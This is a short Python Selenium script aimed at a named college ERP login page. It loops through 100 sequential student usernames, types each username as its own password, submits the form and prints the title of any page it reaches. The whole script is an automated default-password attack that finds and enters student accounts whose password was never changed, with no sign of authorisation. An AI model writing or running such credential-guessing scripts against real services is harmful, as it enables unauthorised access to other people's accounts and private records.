from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
import time

options = Options()
options.add_argument("--headless")  # no browser UI
options.add_argument("--disable-gpu")

driver = webdriver.Chrome(options=options)

limit = 100
field = "TCS22"

for i in range(0,limit):

    roll="00"+str(i)
    roll=roll[-3:]

    userName = field + roll
    print(userName)

    driver.get("https://erpx.gpgit.com/erp/academic/users/login")

    driver.find_element(By.ID, "username").send_keys(userName)          #login creds
    driver.find_element(By.ID, "UserPassword").send_keys(userName)

    checkbox = driver.find_element(By.ID, "checkbox_2")                 #checkbox for keep me loged in
    if not checkbox.is_selected():
        checkbox.click()

    try:
        driver.find_element(By.CLASS_NAME, "btn").click()               #clicks login button
        time.sleep(2)


        # checkbox=driver.find_element(By.CLASS_NAME,"btn")               #finds button for complete details
        # checkbox.click() 

        soup = BeautifulSoup(driver.page_source, "html.parser")   
        tag = soup.find("h2", class_="page-title")
        print(tag.text)

    except Exception as e:
        continue

driver.quit()